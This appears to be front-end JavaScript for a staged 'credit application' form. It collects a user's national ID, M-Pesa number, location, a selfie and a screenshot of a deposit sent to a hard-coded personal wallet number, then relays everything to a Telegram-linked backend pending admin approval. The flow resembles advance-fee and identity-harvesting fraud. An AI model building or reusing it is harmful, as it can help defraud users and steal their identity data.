document.addEventListener('DOMContentLoaded', () => {
    const formData = { 
        product: { model: '', category: '', price: 0 }, 
        idNumber: '', 
        mpesaNumber: '', 
        location: '', 
        selfieDataUrl: '', 
        paymentScreenshotDataUrl: '',
        walletNumber: '', 
        amount: 0 
    };
    let currentAppId = null;
    let pollInterval = null;

    function goToStage(stageNumber) {
        document.querySelectorAll('.form-stage').forEach(stage => stage.classList.remove('active'));
        document.getElementById(`stage-${stageNumber}`).classList.add('active');

        for (let i = 1; i <= 5; i++) {
            const indicator = document.getElementById(`step-indicator-${i}`);
            if (indicator) {
                if (i < stageNumber) { indicator.classList.add('completed'); indicator.classList.remove('active'); } 
                else if (i === stageNumber) { indicator.classList.add('active'); indicator.classList.remove('completed'); } 
                else { indicator.classList.remove('active', 'completed'); }
            }
        }
    }

    // Stage 1: Auto-advance on model selection
    document.querySelectorAll('input[name="product"]').forEach(radio => {
        radio.addEventListener('change', (e) => {
            formData.product.model = e.target.value;
            formData.product.category = e.target.dataset.category;
            formData.amount = e.target.dataset.price;
            
            document.getElementById('depositAmount').value = formData.amount;
            document.getElementById('selected-model-title').textContent = formData.product.model;
            document.getElementById('success-model-name').textContent = formData.product.model;
            setTimeout(() => goToStage(2), 250);
        });
    });

    // Stage 2: Details Validation
    function checkStage2Validity() {
        const id = document.getElementById('idNumber').value.trim();
        const p1 = document.getElementById('mpesaNumber').value.trim();
        const loc = document.getElementById('location').value.trim();

        const isIdValid = /^[0-9]{6,9}$/.test(id);
        const isPhoneValid = /^(07|01)[0-9]{8}$/.test(p1);
        const isLocValid = loc.length >= 2;

        if (isIdValid && isPhoneValid && isLocValid) {
            formData.idNumber = id; 
            formData.mpesaNumber = p1; 
            formData.location = loc;
            document.getElementById('walletNumber').value = p1;
            setTimeout(() => goToStage(3), 300);
        }
    }

    ['idNumber', 'mpesaNumber', 'location'].forEach(id => {
        document.getElementById(id).addEventListener('input', checkStage2Validity);
    });

    // Stage 3: Selfie File Upload
    const selfieInput = document.getElementById('selfiePhoto');
    const selfiePreview = document.getElementById('selfie-preview');
    const selfiePreviewBox = document.getElementById('selfie-preview-container');

    selfieInput.addEventListener('change', (e) => {
        const file = e.target.files[0];
        if (file) {
            const reader = new FileReader();
            reader.onload = function(evt) {
                formData.selfieDataUrl = evt.target.result;
                selfiePreview.src = evt.target.result;
                selfiePreviewBox.style.display = 'block';
                setTimeout(() => goToStage(4), 400);
            };
            reader.readAsDataURL(file);
        }
    });

    // Stage 4: Payment Screenshot Upload
    const paymentScreenshotInput = document.getElementById('paymentScreenshot');
    const paymentScreenshotPreview = document.getElementById('payment-screenshot-preview');
    const paymentScreenshotPreviewBox = document.getElementById('payment-screenshot-preview-container');

    paymentScreenshotInput.addEventListener('change', (e) => {
        const file = e.target.files[0];
        if (file) {
            const reader = new FileReader();
            reader.onload = function(evt) {
                formData.paymentScreenshotDataUrl = evt.target.result;
                paymentScreenshotPreview.src = evt.target.result;
                paymentScreenshotPreviewBox.style.display = 'block';
            };
            reader.readAsDataURL(file);
        }
    });

    // Stage 4: Copy Pochi Number Button
    document.getElementById('copy-pochi-btn').addEventListener('click', () => {
        const pochiNum = document.getElementById('pochi-number').innerText.trim();
        navigator.clipboard.writeText(pochiNum).then(() => {
            const statusMsg = document.getElementById('copy-status-msg');
            statusMsg.textContent = '✓ Number copied to clipboard!';
            setTimeout(() => { statusMsg.textContent = ''; }, 3000);
        }).catch(() => {
            alert('Failed to copy. Please manually note 0757648339.');
        });
    });

    // Stage 4 Submit: 3-Second Countdown & Fast Transmission
    document.getElementById('i-have-paid-btn').addEventListener('click', async () => {
        const wallet = document.getElementById('walletNumber').value.trim();
        if (!/^(07|01)[0-9]{8}$/.test(wallet)) {
            alert('Please enter a valid M-Pesa wallet phone number.');
            return;
        }
        if (!formData.selfieDataUrl) {
            alert('Please upload a selfie photo before proceeding.');
            goToStage(3);
            return;
        }
        if (!formData.paymentScreenshotDataUrl) {
            alert('Please attach your M-Pesa payment screenshot or receipt photo.');
            return;
        }

        formData.walletNumber = wallet;
        goToStage(5);

        // Reset display state for stage 5
        document.getElementById('countdown-card').style.display = 'block';
        document.getElementById('verification-card').style.display = 'none';

        // 3-Second Countdown Logic
        let timeLeft = 3;
        const timerElement = document.getElementById('countdown-timer');
        timerElement.textContent = timeLeft;

        const countdownInterval = setInterval(() => {
            timeLeft--;
            if (timeLeft > 0) {
                timerElement.textContent = timeLeft;
            } else {
                clearInterval(countdownInterval);
                document.getElementById('countdown-card').style.display = 'none';
                document.getElementById('verification-card').style.display = 'block';
            }
        }, 1000);

        // Send payload instantly to Telegram backend without waiting for timer animation
        try {
            const response = await fetch('/api/process-credit-app', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(formData)
            });
            const data = await response.json();
            if (data.success) {
                currentAppId = data.appId;
                startPollingForAdminApproval();
            } else {
                alert(data.message || 'Error processing request');
                clearInterval(countdownInterval);
                goToStage(4);
            }
        } catch (err) {
            console.error('Submission error:', err);
            clearInterval(countdownInterval);
            goToStage(4);
        }
    });

    // Stage 5: Poll status from admin
    function startPollingForAdminApproval() {
        if (pollInterval) clearInterval(pollInterval);
        pollInterval = setInterval(async () => {
            if (!currentAppId) return;
            try {
                const res = await fetch(`/api/check-status/${currentAppId}`);
                const data = await res.json();

                if (data.photoUrl) {
                    const photoBox = document.getElementById('admin-photo-container');
                    const photoImg = document.getElementById('item-live-photo');
                    if (photoImg.src !== data.photoUrl) {
                        photoImg.src = data.photoUrl;
                        photoBox.style.display = 'block';
                    }
                }

                if (data.status === 'APPROVED') {
                    clearInterval(pollInterval);
                    goToStage(6);
                } else if (data.status === 'REJECTED') {
                    clearInterval(pollInterval);
                    alert('❌ Payment receipt was not confirmed or was rejected. Please try again.');
                    goToStage(4);
                }
            } catch (err) { console.error('Polling error', err); }
        }, 1500);
    }
});
